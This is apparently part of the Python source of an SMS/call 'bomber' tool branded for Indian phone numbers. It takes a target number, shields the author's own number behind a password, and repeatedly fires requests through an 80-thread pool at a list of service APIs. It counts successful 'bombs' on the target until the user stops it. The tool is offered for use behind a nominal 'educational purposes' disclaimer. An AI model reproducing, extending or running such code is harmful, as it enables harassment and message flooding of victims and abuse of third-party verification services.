 b=f"\n╔══════════════════════════════════════════════════╗\n║                                                  ║\n║     ██████╗ ██████╗ ██████╗ ██████╗ █████╗       ║\n║    ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗     ║\n║    ██║     ██║   ██║██████╔╝██████╔╝███████║     ║\n║    ██║     ██║   ██║██╔══██╗██╔══██╗██╔══██║     ║\n║    ╚██████╗╚██████╔╝██████╔╝██║  ██║██║  ██║     ║\n║     ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ║\n║                                                  ║\n║               B O M B E R   V {cur_v}              ║\n║                                                  ║\n║                 𝘽𝙔 𝘾𝙍𝘼𝘾𝙆𝙄𝙉𝙂 𝙎𝘾𝙃𝙊𝙊𝙇               ║\n╚══════════════════════════════════════════════════╝"
 w=os.get_terminal_size().columns
 for l in b.split('\n'):
  if l.strip():ani_txt(l.center(w),delay=0.0015,col=C.RED);time.sleep(0.05)
  else:print()
 print()
 disclaimer_lines=["\033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m","\033[1;41m\033[1;37mㅤ    ᴅɪsᴄʟᴀɪᴍᴇʀ: ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ʀᴇsᴘᴏɴsɪʙʟᴇ       ㅤ\033[0m","\033[1;41m\033[1;37mㅤ    ғᴏʀ ᴀɴʏ ᴍɪsᴜsᴇ ᴏʀ ᴅᴀᴍᴀɢᴇ ᴄᴀᴜsᴇᴅ ʙʏ ᴛʜɪs sᴄʀɪᴘᴛ      ㅤ\033[0m","\033[1;41m\033[1;37mㅤ    ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ ᴜsᴇ ᴛʜɪs sᴄʀɪᴘᴛ ғᴏʀ ᴛᴀᴋɪɴɢ ʀᴇᴠᴇɴɢᴇ    ㅤ\033[0m","\033[1;41m\033[1;37mㅤ    ᴜsᴇ ᴛʜɪs ᴛᴏᴏʟ ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴘᴜʀᴘᴏsᴇs ᴏɴʟʏ         ㅤ\033[0m","\033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m"]
 for line in disclaimer_lines:
  padding=(w-60)//2
  print(f"{' '*padding}{line}")
 print()
 print(f"\n{C.YELLOW}{'═'*w}{C.END}")
def get_phn():
 def chk_pwd(m):
  for a in range(3):
   p=input(f"{C.GREEN}ᴘᴀssᴡᴏʀᴅ? : {C.CYAN}").strip()
   if p==self_pwd:lod_anim(0.8,"ᴀᴜᴛʜᴏʀɪᴢɪɴɢ");return m
   else:print(f"{C.RED}Wrong! {2-a} tries left{C.END}" if a<2 else f"{C.RED}ᴡʀᴏɴɢ ᴘᴀssᴡᴏʀᴅ! ᴇxɪᴛɪɴɢ{C.END}");time.sleep(1) if a==2 else None
   if a==2:os._exit(0)
 while True:
  m=input(f"\n{C.GREEN}ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ: {C.CYAN}").strip()
  m=''.join(filter(str.isdigit,m))
  if len(m)==10:
   if m==tok_self:return chk_pwd(m)
   lod_anim(0.8,"ᴠᴀʟɪᴅᴀᴛɪɴɢ");return m
  elif len(m)==12 and m.startswith('91'):
   m=m[2:]
   if m==tok_self:return chk_pwd(m)
   lod_anim(0.8,"ᴠᴀʟɪᴅᴀᴛɪɴɢ");return m
  else:print(f"\r{C.RED}✗ ɪɴᴠᴀʟɪᴅ! 10 ᴅɪɢɪᴛs: {C.CYAN}",end="")
def main():
 global sht_flg,suc_cnt,reg_dic
 suc_cnt=0;reg_dic={'mastram':False,'gracedaily':False}
 chk_upd();chk_not()
 clr_scr();shw_ban();m=get_phn();snd_str(m);m91=f"91{m}";m91p=f"+91{m}";w=os.get_terminal_size().columns
 threading.Thread(target=decoy_clock, daemon=True).start()
 time.sleep(2)
 typ_eff(f"\nɴᴜᴍʙᴇʀ ʟᴏᴄᴋᴇᴅ: {m}",delay=0.03,col=C.RED);print(f"\n{C.YELLOW}{'═'*w}{C.END}\n");print()
 apis=APIS
 ani_txt("▶ ʙᴏᴍʙɪɴɢ sᴛᴀʀᴛᴇᴅ\n",delay=0.05,col=C.RED);ani_txt("▶ ᴘʀᴇss ᴄᴛʀʟ+ᴄ ᴛᴏ sᴛᴏᴘ\n\n",delay=0.03,col=C.YELLOW);st=time.time()
 def sig_h(sig,frame):global sht_flg;sht_flg=True;print(f"\n\n\n\n{C.YELLOW}▶ sᴛᴏᴘᴘɪɴɢ...{C.END}\n")
 signal.signal(signal.SIGINT,sig_h);ex=ThreadPoolExecutor(max_workers=80)
 active_apis=apis.copy()
 try:
  while not sht_flg:
   for a in active_apis[:]:fir_fire(a,m,m91,m91p,ex,active_apis)
   elapsed = time.time() - st
   prg_bar(suc_cnt, elapsed)
   time.sleep(0.009)
 except:pass
 finally:
  ex.shutdown(wait=False)
  if sht_flg:
   for w in range(5):
    if sum(1 for t in threading.enumerate() if t!=threading.main_thread() and not t.daemon)==0:break
    sys.stdout.write(f"\r{C.CYAN}▶ ᴡᴀɪᴛɪɴɢ {5-w}s...{C.END}");sys.stdout.flush();time.sleep(1)
   sys.stdout.write("\r"+" "*70+"\r");el=time.time()-st;mins=int(el//60);secs=int(el%60)
   line1=f"▶ ᴛᴏᴛᴀʟ ʙᴏᴍʙs: {suc_cnt}"
   line2=f"▶ ᴛᴀʀɢᴇᴛ: {m}"
   line3=f"⏱️  ᴅᴜʀᴀᴛɪᴏɴ: {mins}m {secs}s"
   lines=[line1,line2,line3];max_len=max(len(l) for l in lines);box_w=max_len+6
   summary_text="sᴜᴍᴍᴀʀʏ";summary_padding=(box_w-len(summary_text))//2
   print(f"\n{C.RED}╔{'═'*box_w}╗{C.END}")
   print(f"{C.RED}║{C.BOLD}{' '*summary_padding}{summary_text}{' '*(box_w-summary_padding-len(summary_text))}{C.END}{C.RED}║{C.END}")
   print(f"{C.RED}╠{'═'*box_w}╣{C.END}")
   print(f"{C.RED}║  {C.GREEN}{line1}{' '*(box_w-len(line1)-2)}{C.YELLOW}{C.END}{C.RED}║{C.END}")
   print(f"{C.RED}║  {C.GREEN}{line2}{' '*(box_w-len(line2)-2)}{C.YELLOW}{C.END}{C.RED}║{C.END}")
   print(f"{C.RED}║  {C.GREEN}{line3}{' '*(box_w-len(line3)-1)}{C.YELLOW}{C.END}{C.RED}║{C.END}")
   print(f"{C.RED}╚{'═'*box_w}╝{C.END}")
   print(f"\n\n{C.GREEN}{'-'*60}{C.END}\n");time.sleep(1);opn_tgm();time.sleep(2);os._exit(0)
if __name__=="__main__":main()